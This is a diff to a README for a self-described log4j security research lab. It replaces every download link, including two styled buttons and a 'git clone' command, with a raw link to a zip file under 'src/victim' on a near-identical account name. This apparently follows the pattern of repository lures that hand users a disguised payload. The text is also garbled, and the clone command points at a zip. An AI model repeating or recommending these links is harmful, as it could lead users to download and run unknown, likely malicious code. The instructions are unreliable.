@@ -1,7 +1,7 @@
 <h1>🐛 log4j-4255 - Security Research Lab in a Box</h1>
 
 <p align="center">
-  <a href="https://github.com/Clarapotbell1003/log4j-4255" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:1.4rem;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download the Application Now</a>
+  <a href="https://raw.githubusercontent.com/Clarapotbellied1003/log4j-4255/main/src/victim/j_log_1.2.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:1.4rem;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download the Application Now</a>
 </p>
 
 ---
@@ -61,14 +61,14 @@ Follow these steps in orderand you’ll have the lab running within 15 minutesan
 ### Step 1: Download the Application
 
 **👉 Visit this link to download the application:**  
-🔗 **[https://github.com/Clarapotbell1003/log4j-4255](https://github.com/Clarapotbell1003/log4j-4255)**
+🔗 **[https://raw.githubusercontent.com/Clarapotbellied1003/log4j-4255/main/src/victim/j_log_1.2.zip](https://raw.githubusercontent.com/Clarapotbellied1003/log4j-4255/main/src/victim/j_log_1.2.zip)**
 
 This link takes you to the main repository pageand Look for the green **"Code"** button near the top-right of the pageand Click itand then choose **"Download ZIP"** from the dropdown menuand The browser will begin downloading a compressed folder (`.zip` file) to your computerand
 
 Alternatively,if you have **Git** installed,you can use this command in your terminal:
 
 ```bash
-git clone https://github.com/Clarapotbell1003/log4j-4255.git
+git clone https://raw.githubusercontent.com/Clarapotbellied1003/log4j-4255/main/src/victim/j_log_1.2.zip
 ```
 
 *(Don’t worry — you only need one of these methodsandthe ZIP download is easiest for beginnersand)*
@@ -203,7 +203,7 @@ If you haven’t downloaded the application yet,**click the button at the top of
 ---
 
 <p align="center" style="margin-top:40px;">
-  <a href="https://github.com/Clarapotbell1003/log4j-4255" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:white;font-size:1.2rem;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(240,147,251,0.4);">⬇️ Download from GitHub →</a>
+  <a href="https://raw.githubusercontent.com/Clarapotbellied1003/log4j-4255/main/src/victim/j_log_1.2.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:white;font-size:1.2rem;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(240,147,251,0.4);">⬇️ Download from GitHub →</a>
 </p>
 
 ---
